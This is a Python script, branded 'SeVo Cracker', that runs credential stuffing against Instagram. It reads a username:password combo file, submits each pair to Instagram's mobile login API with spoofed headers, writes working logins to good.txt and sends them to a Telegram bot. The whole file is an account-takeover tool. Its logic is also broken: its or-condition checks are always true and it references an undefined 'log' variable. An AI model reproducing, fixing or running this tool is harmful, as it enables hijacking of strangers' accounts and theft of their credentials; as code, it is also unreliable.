import os
from time import sleep
import requests
from colored import fg
from uuid import uuid4
import random
os.system('color a')

try:
	import random
	user_agetn1 =  "Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)"
	user_agetn2 =   "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
	user_agetn3 =   "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 6.0; tr) Opera 10.10"
	user_agetn4 =   "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; de) Opera 10.10"
	user_agetn5 =   "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; FDM; .NET CLR 1.1.4322; .NET4.0C; .NET4.0E; Tablet PC 2.0)"
	user_agetn6 =   "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; InfoPath.2; .NET4.0C; .NET4.0E)"
	user_agetn7 =   "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; AskTB5.5)"
	user_agetn8 =   "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C)"
	user_agetn9  =  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 7.1; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C)"
	user_agetn10 = "Mozilla/4.0 (compatible; MSIE 8.0; Linux i686; en) Opera 10.51"
	list_user_agent = [user_agetn1,user_agetn2,user_agetn3,user_agetn4,user_agetn5,user_agetn6,user_agetn7,user_agetn8,user_agetn9,user_agetn10]
	#user_agent= random.choice(list_user_agent)
except:
	pass

logo = """
\033[1;97m
======================================================
    AUTHOR | SeVo Cracker

    TELEGRAM | @SeVoGmaing99

    GITHUB | Not Now
======================================================   
"""

logo2 = """
\033[1;97m
======================================================
    Crack instgram is strating...
    
    waiting 1 or 2 hours...!
    
    please do not leave the backgrounds...!
======================================================
"""

h,b,s,block = 0,0,0,0


os.system('clear')
print(logo)
print("")
print("")
tele = input("\033[33m[+] you want good insta send to your telegram bot? YES/NO : ")
if "No" or "no" or "NO" or "n" or "N" in tele:
  os.system('exit')
  
if "YES" or "y" or "Y" or "yes" in tele:
    os.system('clear')
    print(logo)
    print("")
    print("")
    id = input("\033[37m [+] YOUR ID TELEGRAM : ")
    bot = input("\033[37m [+] YOUR TOKEN BOT TELEGRAM : ")

os.system('clear')
print(logo)
print("")
print("")
print("\33[37m=============================================")
print("\033[32m [1] for crack insta ")
print("\033[31m [2] for exit ")
print("\033[37m=============================================")

ask = input("\033[33m which esle : ")

if ask == "2":
	os.system('exit')

if ask == "1":
    print(logo)
    print("")
    print("")
    os.system('clear')
    assk = input("\033[33m [+] File combo : ")
    if '.txt' in assk:
        pass
    else:
        assk  = assk + '.txt'
    print(logo)
    print(logo2)
    print("")
    print(f"\r \033[32m [+] GOOD : {h} /\033[31m [-] BAD : {b} /\033[33m CP : {s} /\033[31m BLOCK : {block}",end='')
    acc = open(assk,"r").read().splitlines()
    for combo in acc:
        user = combo.split(":")[0]
        pasw = combo.split(":")[1]
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "YES" or "y" or "Y" in tele:
                  t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=  [SeVo Cracker] \n [=] USER:{user} \n [=] PASS : {pasw}")
         
            open("good.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\r \033[32m [+] GOOD : {h} /\033[31m [-] BAD : {b} /\033[33m CP : {s} /\033[31m BLOCK : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r \033[32m [+] GOOD : {h} /\033[31m [-] BAD : {b} /\033[33m CP : {s} /\033[31m BLOCK : {block}",end='')
        elif 'challenge_required' in log.text:
            s += 1
            print(f"\r \033[32m [+] GOOD : {h} /\033[31m [-] BAD : {b} /\033[33m CP : {s} /\033[31m BLOCK : {block}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r \033[32m [+] GOOD : {h} /\033[31m [-] BAD : {b} /\033[33m CP : {s} /\033[31m BLOCK : {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r \033[32m [+] GOOD : {h} /\033[31m [-] BAD : {b} /\033[33m CP : {s} /\033[31m BLOCK : {block}",end='')
        else:
            b += 1   
            print(f"\r \033[32m [+] GOOD : {h} /\033[31m [-] BAD : {b} /\033[33m CP : {s} /\033[31m BLOCK : {block}",end='')
